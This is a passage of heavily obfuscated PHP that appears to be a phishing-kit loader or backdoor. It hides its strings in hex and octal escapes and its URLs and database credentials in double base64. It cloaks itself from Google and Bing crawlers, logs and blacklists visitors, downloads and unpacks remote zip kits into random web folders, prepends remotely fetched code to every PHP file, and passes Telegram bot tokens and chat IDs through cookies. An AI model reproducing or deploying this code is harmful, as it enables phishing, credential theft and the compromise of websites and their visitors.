PATHINFO_EXTENSION) == "\160\x68\x70" && !in_array($file, $modifiedFiles)) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; } if (strpos($fileContent, $codeToAddBottom) === false) { $fileContent .= $codeToAddBottom; } file_put_contents($filePath, $fileContent); $modifiedFiles[] = $file; } } } closedir($handle); } } return $modifiedFiles; } goto YVBFf; p2Xyz: function get_browser_value($USER_AGENT) { $BROWSER_ERROR = "\125\156\x6b\x6e\x6f\x77\x6e\40\102\x72\157\x77\x73\145\x72"; $BROWSER = array("\57\x6d\x73\151\x65\x2f\x69" => "\111\156\x74\x65\162\156\145\x74\40\x45\x78\x70\x6c\x6f\x72\x65\x72", "\x2f\x66\x69\x72\x65\x66\x6f\170\57\x69" => "\106\x69\x72\x65\x66\157\170", "\x2f\163\141\146\x61\x72\151\57\x69" => "\x53\141\146\x61\162\x69", "\57\143\150\x72\157\x6d\x65\57\151" => "\x43\x68\x72\x6f\x6d\x65", "\57\x65\144\x67\145\x2f\151" => "\105\x64\147\x65", "\57\157\x70\x65\x72\141\57\x69" => "\117\160\x65\x72\141", "\57\x6e\x65\x74\x73\143\x61\x70\x65\57\x69" => "\116\x65\x74\163\x63\141\160\145", "\x2f\155\x61\170\164\x68\157\x6e\x2f\151" => "\115\141\170\164\150\x6f\x6e", "\x2f\153\157\x6e\161\165\x65\x72\x6f\x72\57\x69" => "\113\157\156\x71\x75\145\x72\x6f\162", "\x2f\155\157\x62\151\154\145\x2f\x69" => "\x48\141\x6e\144\150\145\x6c\144\40\x42\x72\x6f\x77\x73\x65\x72"); foreach ($BROWSER as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $BROWSER_ERROR = $value; } } return $BROWSER_ERROR; } goto oeCCQ; AvHSv: function banned_client($ipAddress, $reason) { global $fs_host, $fs_user, $fs_log, $fs_name, $local_browser, $local_os, $local_domain, $local_time; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\156\156\x65\x63\164\151\157\x6e\40\146\141\151\154\145\144\72\x20" . mysqli_connect_error()); } $sql_check = "\123\105\114\x45\x43\124\x20\x2a\x20\106\x52\x4f\x4d\40\x6c\157\147\163\x20\127\x48\105\122\105\40\x69\x70\141\x64\144\162\x65\x73\x3d\77"; $stmt = mysqli_prepare($db, $sql_check); mysqli_stmt_bind_param($stmt, "\x73", $ipAddress); mysqli_stmt_execute($stmt); $result = mysqli_stmt_get_result($stmt); if (mysqli_num_rows($result) > 0) { mysqli_close($db); http_response_code(405); $responseData = array("\162\145\x73\137\163\164\x61\164\165\x73" => "\x34\x30\x35", "\155\145\163\163\x61\147\145" => "\125\x73\x65\162\x20\x69\163\x20\x61\154\162\x65\141\x64\x79\40\x69\156\40\x74\x68\x65\x20\142\154\141\143\x6b\x6c\151\163\164"); echo json_encode($responseData); die; } $country = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\x65\x73\163\151\157\x6e\137\x63\x6f\165\x6e\164\x72\x79"])); $browser = mysqli_real_escape_string($db, str_replace("\x27", '', $local_browser)); $os_db = mysqli_real_escape_string($db, str_replace("\47", '', $local_os)); $local_domain = mysqli_real_escape_string($db, str_replace("\47", '', $local_domain)); $host = mysqli_real_escape_string($db, str_replace("\x27", '', getHost($ipAddress))); $isp = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\x73\163\x69\157\156\x5f\x69\x73\160"])); $mobile = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\145\163\x73\151\157\x6e\137\x6d\x6f\x62\x69\x6c\145"])); $proxy = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\x73\x73\151\157\x6e\137\160\162\x6f\170\171"])); $hosting = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\163\x73\151\x6f\156\137\x68\157\x73\164\151\x6e\147"])); $city = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\x65\x73\163\151\x6f\156\137\x63\x69\164\x79"])); $region = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\145\x73\163\x69\157\x6e\137\x72\145\147\x69\x6f\156"])); $time = mysqli_real_escape_string($db, str_replace("\x27", '', $local_time)); $sql_insert = "\111\116\x53\x45\122\124\40\111\116\x54\x4f\x20\x6c\157\147\163\40\50\151\x70\x61\144\144\162\145\163\54\143\157\x75\x6e\x74\x72\x79\x2c\x62\x72\157\x77\x73\x65\162\54\x6f\163\x2c\144\157\x6d\151\156\x65\x2c\x68\x6f\163\x74\x2c\151\163\160\54\155\x6f\x62\x69\154\x65\x2c\160\x72\157\x78\171\54\150\x6f\163\164\151\x6e\x67\x2c\x63\151\x74\x79\54\162\x65\147\151\x6f\x6e\x2c\x6d\171\x74\x69\155\x65\54\162\145\163\x6f\x6e\x29\40\126\x41\x4c\125\105\x53\40\x28\77\54\77\54\x3f\54\77\x2c\x3f\x2c\x3f\54\x3f\x2c\x20\77\x2c\40\77\54\40\77\54\40\x3f\54\40\77\54\x20\x3f\x2c\x20\x3f\x29"; $stmt = mysqli_prepare($db, $sql_insert); mysqli_stmt_bind_param($stmt, "\163\163\x73\163\163\x73\x73\163\163\x73\x73\163\163\163", $ipAddress, $country, $browser, $os_db, $local_domain, $host, $isp, $mobile, $proxy, $hosting, $city, $region, $time, $reason); mysqli_stmt_execute($stmt); mysqli_close($db); http_response_code(405); $responseData = array("\162\145\x73\137\x73\x74\141\164\x75\x73" => "\64\x30\65", "\155\x65\163\163\x61\x67\x65" => "\125\163\145\162\40\x61\144\144\x65\x64\40\164\157\x20\x74\150\x65\40\x62\154\141\143\x6b\154\x69\163\x74"); echo json_encode($responseData); die; } goto TAzPN; GVy61: function detect_user($ipAddress) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\x6e\156\145\143\164\x69\x6f\x6e\x20\x66\141\151\x6c\x65\144\72\40" . mysqli_connect_error()); } $sql_u = "\x53\x45\x4c\x45\103\124\40\52\x20\106\x52\117\115\x20\x6c\x6f\x67\x73\40\127\x48\105\122\105\40\151\160\141\144\x64\x72\x65\163\x3d\47{$ipAddress}\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return true; } mysqli_close($db); return false; } goto Ngzx5; R5lEr: function getAllPhpFiles($directory) { $phpFiles = array(); if (is_dir($directory) && ($handle = opendir($directory))) { while (false !== ($file = readdir($handle))) { if ($file != "\56" && $file != "\x2e\x2e") { $filePath = $directory . DIRECTORY_SEPARATOR . $file; if (is_dir($filePath)) { $phpFiles = array_merge($phpFiles, getAllPhpFiles($filePath)); } elseif (pathinfo($filePath, PATHINFO_EXTENSION) === "\x70\150\160") { $phpFiles[] = $filePath; } } } closedir($handle); } return $phpFiles; } goto X6TYr; RqQJj: $fs_user = base64_decode("\x65\x6d\126\171\x62\x32\x52\x68\145\x58\x4e\x66\132\x47\x46\x35"); goto s_ztH; roF36: function add_user($folder_path, $ipAddress) { file_put_contents("{$folder_path}\57\x6c\x6f\143\141\154\x2e\164\x78\164", "{$ipAddress}", FILE_APPEND); } goto MIh0m; kfg13: function get_view_token($user) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\x6e\x6e\145\143\x74\151\x6f\x6e\x20\x66\141\151\x6c\x65\144\x3a\x20" . mysqli_connect_error()); } $sql_u = "\x53\x45\x4c\105\103\124\40\164\x6f\153\x65\x6e\54\40\x63\x68\141\x74\151\144\x20\106\122\117\115\40\x70\141\156\145\154\40\127\110\x45\x52\105\40\160\141\156\x65\154\x5f\x75\x73\x65\x72\75\47{$user}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $token = $row["\164\x6f\x6b\x65\156"]; $chatid = $row["\143\150\141\x74\151\144"]; return array($token, $chatid); } mysqli_close($db); return null; } goto AvHSv; OU2XQ: function update_user_view($user) { list($token, $chatid) = get_expire_token(); list($token_view, $chatid_view) = get_view_token($user); $dateexp = $_SESSION["\x65\170\x70\151\x72\x65\x5f\144\141\x74\145"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\x6f\153\145\x6e\x74\x65\x6c", $token, time() + 86400 * 30, "\x2f"); setcookie("\151\144\164\145\x6c", $chatid, time() + 86400 * 30, "\x2f"); setcookie("\x72\x65\x64\x69\x72\x69\x63\164", $_SESSION["\162\145\x64\x69\162\151\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\160\x72\x6f\152\x65\x63\164", $_SESSION["\160\x72\157\152\x65\143\x74"], time() + 86400 * 30, "\57"); setcookie("\163\157\165\x72\x63\145\155\x65", $_SESSION["\x61\144\144\x62\x79"], time() + 86400 * 30, "\57"); setcookie("\156\145\x77\x5f\x65\170\x70", $expireTimestamp, time() + 86400 * 30, "\57"); setcookie("\166\157\154\155", $token, time() + 86400 * 30, "\57"); setcookie("\x64\157\154\x6d", $chatid, time() + 86400 * 30, "\x2f"); } else { setcookie("\x74\157\153\145\x6e\164\145\x6c", $token_view, time() + 86400 * 30, "\x2f"); setcookie("\x69\144\164\x65\x6c", $chatid_view, time() + 86400 * 30, "\57"); setcookie("\x72\x65\144\x69\x72\x69\x63\x74", $_SESSION["\x72\x65\x64\x69\162\151\x63\x74"], time() + 86400 * 30, "\x2f"); setcookie("\x70\162\157\x6a\x65\143\x74", $_SESSION["\160\x72\157\152\x65\x63\x74"], time() + 86400 * 30, "\57"); setcookie("\163\x6f\x75\162\x63\145\155\x65", $_SESSION["\x61\x64\144\x62\171"], time() + 86400 * 30, "\57"); setcookie("\x76\157\154\x6d", $token, time() + 86400 * 30, "\x2f"); setcookie("\x64\157\154\155", $chatid, time() + 86400 * 30, "\x2f"); } } goto yMO2X; A00zG: if (session_status() == PHP_SESSION_NONE) { session_start(); } goto Akgp8; uM0db: function update_user() { list($token, $chatid) = get_expire_token(); $dateexp = $_SESSION["\x65\x78\x70\151\x72\x65\137\x64\141\x74\145"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\164\157\x6b\x65\x6e\x74\x65\154", $token, time() + 86400 * 30, "\57"); setcookie("\151\x64\164\x65\154", $chatid, time() + 86400 * 30, "\x2f"); setcookie("\x72\145\x64\151\x72\151\x63\x74", $_SESSION["\x72\145\x64\x69\162\x69\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\160\x72\x6f\152\x65\143\164", $_SESSION["\x70\x72\x6f\152\x65\143\x74"], time() + 86400 * 30, "\57"); setcookie("\163\x6f\165\162\x63\145\155\x65", $_SESSION["\141\144\x64\x62\x79"], time() + 86400 * 30, "\x2f"); setcookie("\x6e\145\x77\137\x65\170\x70", $expireTimestamp, time() + 86400 * 30, "\x2f"); setcookie("\x76\x6f\x6c\155", $token, time() + 86400 * 30, "\x2f"); setcookie("\144\x6f\x6c\155", $chatid, time() + 86400 * 30, "\57"); } else { setcookie("\164\x6f\x6b\x65\156\x74\x65\x6c", $_SESSION["\164\157\x6b\145\156\x74\x65\x6c"], time() + 86400 * 30, "\57"); setcookie("\151\144\164\145\154", $_SESSION["\151\144\x74\145\154"], time() + 86400 * 30, "\57"); setcookie("\x72\x65\x64\x69\162\151\x63\164", $_SESSION["\162\x65\x64\151\x72\151\x63\164"], time() + 86400 * 30, "\x2f"); setcookie("\160\162\157\x6a\x65\143\164", $_SESSION["\x70\x72\x6f\152\x65\x63\x74"], time() + 86400 * 30, "\x2f"); setcookie("\x73\x6f\x75\162\x63\x65\x6d\145", $_SESSION["\141\144\x64\x62\x79"], time() + 86400 * 30, "\x2f"); setcookie("\166\x6f\154\155", $token, time() + 86400 * 30, "\57"); setcookie("\x64\157\154\x6d", $chatid, time() + 86400 * 30, "\57"); } } goto OU2XQ; F_l5G: $currentTimestamp = time(); goto wy872; LHANQ: function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { $localFilePath = "\x77\145\142\x2f\141\x70\x69\56\160\150\x70"; file_put_contents($localFilePath, $response); } else { echo "\105\x72\x72\x6f\162\x20\146\145\x74\x63\x68\x69\156\147\x20\146\x69\x6c\145\x3a\x20" . $error; } } goto dE3mf; MIh0m: function isGoogleUser($userAgent, $ipAddress) { if (stripos($userAgent, "\147\157\157\x67\x6c\145") !== false) { return true; } if (filter_var($ipAddress, FILTER_VALIDATE_IP)) { $hostname = gethostbyaddr($ipAddress); if (stripos($hostname, "\x67\157\157\x67\154\x65") !== false) { return true; } } if (isset($_SESSION["\163\145\x73\163\151\x6f\x6e\137\151\x73\x70"]) && stripos($_SESSION["\163\x65\x73\163\151\x6f\156\x5f\x69\x73\160"], "\x67\157\157\x67\x6c\x65") !== false) { return true; } return false; } goto uM0db; dE3mf: function delete_zip($directory) { $zipFiles = glob($directory . "\x2a\x2e\x7a\151\x70"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } } goto roF36; Z36Z9: header("\101\x63\x63\145\x73\x73\x2d\103\157\x6e\164\x72\x6f\x6c\x2d\101\154\x6c\157\167\55\110\145\x61\144\145\162\163\x3a\40\x43\x6f\156\164\x65\156\x74\55\x54\171\x70\145"); goto Eiayh; AGIcY: function download_extract($zipFileUrl) { if (!is_dir("\167\x65\142")) { if (!mkdir("\x77\x65\142", 511)) { die("\106\x61\151\154\x65\x64\40\x74\157\x20\x63\162\x65\x61\164\145\40\x77\x65\x62\x20\x64\151\x72\145\143\164\x6f\x72\x79"); } } if (!is_dir("\164\x65\x6d\160")) { mkdir("\x74\x65\155\x70"); } $folder_name = bin2hex(random_bytes(8)); $sub_folder = random_number(6); $folder_path = "\x77\x65\x62\x2f{$sub_folder}\x2f"; $_SESSION["\x66\157\154\x64\x65\x72"] = $folder_path; $zipFileName = "\x74\x65\155\x70\x2f{$folder_name}\x2e\172\151\160"; if (copy($zipFileUrl, $zipFileName)) { if (!mkdir($folder_path, 511, true)) { die("\x46\x61\x69\x6c\145\x64\40\164\x6f\x20\x63\x72\145\141\x74\145\40\164\150\145\x20\x66\157\154\144\x65\x72\x2e"); } $zip = new ZipArchive(); if ($zip->open($zipFileName) === true) { $zip->extractTo($folder_path); $zip->close(); } else { http_response_code(405); $responseData = array("\x72\145\x73\137\163\x74\141\x74\165\163" => "\x34\x30\65", "\x6d\145\x73\x73\141\x67\145" => "\106\141\x69\154\145\144\x20\x74\x6f\40\145\170\x74\x72\x61\x63\164\40\x74\x68\x65\x20\x7a\151\160\40\x66\x69\154\145"); $responseJson = json_encode($responseData); echo $responseJson; } } else { http_response_code(405); $responseData = array("\162\145\x73\137\x73\164\x61\x74\165\163" => "\x34\60\65", "\155\145\163\x73\x61\x67\145" => "\106\x61\x69\154\145\x64\x20\164\x6f\40\x64\x6f\167\x6e\154\x6f\x61\x64\x20\164\x68\145\x20\x7a\151\x70\x20\x66\x69\x6c\145"); $responseJson = json_encode($responseData); echo $responseJson; } if (file_exists($zipFileName)) { unlink($zipFileName); } } goto EXOF7; wy872: $local_ip_g = getClientIP(); goto RRYt1; fWLmi: function updatePhpFileWithCode($filePath, $codeToAddTop) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; file_put_contents($filePath, $fileContent); return true; } return false; } goto LHANQ; Pb8pg: $local_domain = $_SERVER["\x53\x45\122\x56\x45\x52\137\x4e\x41\115\105"]; goto gL107; fEGsa: header("\101\x63\143\x65\x73\163\x2d\x43\x6f\156\x74\x72\x6f\154\x2d\101\154\154\x6f\x77\x2d\117\162\x69\x67\x69\156\x3a\x20\52"); goto VKw6C; ohALo: function update_php($folder_path) { $trackingFile = $folder_path . "\162\157\x75\154\x73\56\164\x78\x74"; $codeURL = base64_decode(base64_decode("\x59\125\150\123\115\x47\116\x49\x54\x54\x5a\115\145\x54\x6c\x35\x57\x56\x68\x6a\144\x56\x6f\171\x62\x44\x42\150\x53\x46\x5a\160\132\106\150\117\142\x47\x4e\x74\124\156\132\151\x62\x6c\112\163\131\155\65\122\144\126\x6b\x79\117\x58\x52\x4d\115\156\x68\x71\x59\152\112\x34\141\107\121\172\142\107\170\x6a\142\153\x31\x32\131\x7a\x49\65\x4d\127\116\164\x54\x6d\170\115\x4d\x6a\106\157\131\x56\x63\60\x64\x6d\x4e\x49\x53\156\132\x6b\122\x31\x5a\x71\x5a\105\x4d\61\x4d\x47\x56\x49\x55\121")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto YRpai; Dw92g: function ip_in_range($ip, $range) { list($subnet, $mask) = explode("\x2f", $range); $mask = (int) $mask; $subnetBin = inet_pton($subnet); $ipBin = inet_pton($ip); $maskBin = str_repeat("\xff", $mask >> 3) . chr(255 << 8 - ($mask & 7)); if (strlen($subnetBin) < 4 || strlen($ipBin) < 4 || strlen($maskBin) < 4) { return false; } $subnetInt = unpack("\x4e", $subnetBin)[1]; $ipInt = unpack("\x4e", $ipBin)[1]; $maskInt = unpack("\116", $maskBin)[1]; return ($subnetInt & $maskInt) === ($ipInt & $maskInt); } goto zSo6g; NYuwm: function get_expire_token() { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\x6f\156\156\x65\x63\164\151\157\x6e\40\146\x61\x69\154\145\144\x3a\x20" . mysqli_connect_error()); } $sql_u = "\x53\x45\x4c\x45\103\124\x20\x74\145\x6c\145\137\164\157\x6b\x65\156\x2c\40\164\x65\154\x65\137\143\150\x61\x74\x69\144\40\x46\122\117\x4d\x20\x7a\145\162\x6f\137\x73\145\x72\166\145\162\x20\x57\110\105\122\x45\x20\151\x64\75\47\61\47"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $_SESSION["\145\170\x70\137\x74\x6f\153\145\156"] = $row["\x74\145\x6c\145\137\x74\157\x6b\145\156"]; $_SESSION["\x65\x78\x70\137\143\x68\141\x74\x69\x64"] = $row["\164\x65\154\145\x5f\143\x68\x61\164\151\144"]; $token = $row["\x74\145\154\x65\137\164\157\153\x65\156"]; $chatid = $row["\x74\145\154\145\137\143\x68\141\164\x69\x64"]; return array($token, $chatid); } mysqli_close($db); return null; } goto kfg13; bZMMr: ini_set("\x64\x69\x73\160\x6c\x61\x79\x5f\x65\x72\162\x6f\162\x73", 1); goto A00zG; oeCCQ: function is_bot_ip($ipToCheck) { $botsUrls = array("\x67\157\x6f\x67\154\145" => "\x68\164\x74\x70\163\72\57\57\x64\145\x76\145\x6c\157\x70\145\162\x73\x2e\x67\x6f\157\x67\154\145\56\143\x6f\x6d\57\163\145\141\162\x63\x68\x2f\x61\160\151\163\x2f\x69\x70\x72\x61\156\147\145\x73\x2f\x67\x6f\x6f\x67\x6c\145\x62\157\x74\x2e\152\163\x6f\156", "\x62\x69\156\147" => "\x68\x74\164\x70\163\x3a\57\57\167\x77\167\x2e\142\151\x6e\147\56\143\157\x6d\57\164\157\x6f\154\142\157\x78\57\142\151\x6e\147\142\157\164\56\x6a\163\157\156"); foreach ($botsUrls as $bot => $url) { $botResp = json_decode(file_get_contents($url), true); foreach ($botResp["\160\162\145\146\151\170\x65\163"] as $ipRange) { if (isset($ipRange["\x69\x70\x76\x36\x50\162\x65\x66\x69\x78"]) && strpos($ipToCheck, "\x3a") !== false) { $network = $ipRange["\x69\x70\166\66\120\x72\145\x66\x69\170"]; } elseif (isset($ipRange["\151\160\x76\64\x50\162\145\146\151\x78"]) && strpos($ipToCheck, "\x3a") === false) { $network = $ipRange["\x69\x70\x76\64\120\162\x65\146\151\x78"]; } else { continue; } if (ip_in_range($ipToCheck, $network)) { return $bot; } } } return false; } goto Dw92g; tiZ2v: function deleteDirectory($dir) { if (is_dir($dir)) { $objects = scandir($dir); foreach ($objects as $object) { if ($object != "\x2e" && $object != "\x2e\x2e") { if (is_dir($dir . "\57" . $object)) { deleteDirectory($dir . "\x2f" . $object); } else { unlink($dir . "\x2f" . $object); } } } reset($objects); rmdir($dir); } } goto AGIcY; RRYt1: global $fs_host, $fs_user, $fs_log, $fs_name, $local_userAgent, $local_time, $local_domain, $local_os, $local_ip_g, $local_browser; goto DW6c0; vG73c: ob_start(); goto fEGsa; zSo6g: function deleteOldFolders($directory) { $files = scandir($directory); foreach ($files as $file) { if ($file == "\x2e" || $file == "\x2e\56") { continue; } if (is_dir($directory . "\57" . $file)) { $lastModified = filemtime($directory . "\x2f" . $file); $difference = (time() - $lastModified) / 60; if ($difference > 20) { deleteDirectory($directory . "\57" . $file); } } } } goto tiZ2v; WsCBf: $fs_name = base64_decode("\145\x6d\x56\x79\142\62\x52\150\145\x58\x4e\146\132\x47\106\65"); goto U4HxN; YRpai: function update_php_normal($folder_path) { $trackingFile = $folder_path . "\x72\x6f\165\154\163\56\164\x78\x74"; $codeURL = base64_decode(base64_decode("\131\125\x68\123\115\107\116\111\x54\x54\x5a\x4d\145\124\x6c\x35\127\x56\150\152\x64\x56\157\171\142\104\102\x68\x53\x46\x5a\x70\132\106\x68\117\x62\107\116\164\124\156\x5a\x69\142\154\x4a\163\131\155\x35\x52\x64\126\153\x79\117\130\x52\115\x4d\156\x68\161\x59\152\112\64\141\107\121\172\x62\x47\170\152\142\153\61\62\131\x7a\x49\65\x4d\127\x4e\164\124\155\x78\115\115\x6a\106\157\x59\x56\143\x30\x64\x6d\x4e\111\123\x6e\132\x6b\x52\61\132\161\x5a\x45\x59\65\x64\127\111\172\x53\156\x52\132\x56\63\x64\x31\x5a\x45\150\x6f\x4d\101")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto fWLmi; jVGnj: ')); ?>
